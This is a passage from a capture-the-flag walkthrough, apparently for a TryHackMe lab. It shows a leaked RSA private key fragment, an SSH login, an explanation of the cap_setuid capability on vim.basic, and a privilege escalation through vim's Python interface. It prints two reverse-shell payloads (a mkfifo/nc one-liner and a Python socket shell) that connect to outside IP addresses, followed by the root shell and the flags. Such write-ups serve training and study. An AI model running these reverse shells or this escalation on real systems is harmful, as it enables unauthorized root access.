3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----
```
```bash
> ssh -i id_rsa leonard@10.201.23.125
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Fri Sep  4 22:57:43 2020 from 192.168.68.129
leonard@undiscovered:~$ 

```
### 🔍 What is cap_setuid+ep?

Linux capabilities are a way to break up the all-powerful root privileges into smaller, specific privileges.

cap_setuid allows a program to make arbitrary changes to the user IDs of its processes — essentially, it's a way to elevate privileges.

The +ep means the capability is effective and permitted, so it's actively usable by the binary.

So, if vim.basic has cap_setuid+ep, it can potentially be abused to change user IDs and escalate privileges (e.g., become root).

## Priv
![priv](priv1.png)
```bash
leonard@undiscovered:~$ ls -al
total 52
drwxr-x--- 5 leonard leonard  4096 Aug 25 04:22 .
drwxr-xr-x 4 root    root     4096 Sep  4  2020 ..
-rw------- 1 root    root        0 Sep  9  2020 .bash_history
-rw-r--r-- 1 leonard leonard  3771 Sep  4  2020 .bashrc
drwx------ 2 leonard leonard  4096 Sep  4  2020 .cache
drwxrwxr-x 2 leonard leonard  4096 Sep  4  2020 .nano
-rw-r--r-- 1 leonard leonard    43 Sep  4  2020 .profile
drwx------ 2 leonard leonard  4096 Sep  4  2020 .ssh
-rw------- 1 leonard leonard 12288 Aug 25 04:22 .swp
-rw------- 1 leonard leonard 10788 Aug 25 04:22 .viminfo
leonard@undiscovered:~$ cat .viminfo
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
```
> root payload
```bash
/usr/bin/vim.basic -c 'py3 import os,socket,subprocess; os.setuid(0); s=socket.socket(); s.connect(("10.23.93.75",4444)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call(["/bin/bash","-p"])'
```
```bash
> nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.23.93.75] from (UNKNOWN) [10.201.23.125] 46918
id
uid=0(root) gid=1002(leonard) groups=1002(leonard),3004(developer)
cd /root
ls
root.txt
cat root.txt
  _    _           _ _                                     _ 
 | |  | |         | (_)                                   | |
 | |  | |_ __   __| |_ ___  ___ _____   _____ _ __ ___  __| |
 | |  | | '_ \ / _` | / __|/ __/ _ \ \ / / _ \ '__/ _ \/ _` |
 | |__| | | | | (_| | \__ \ (_| (_) \ V /  __/ | |  __/ (_| |
  \____/|_| |_|\__,_|_|___/\___\___/ \_/ \___|_|  \___|\__,_|
      
             THM{8d7b7299cccd1796a61915901d0e091c}


```
### Flags
- user.txt 
  - THM{8d7b7299cccd1796dfsda61915901d0e091c}
![done](done.png)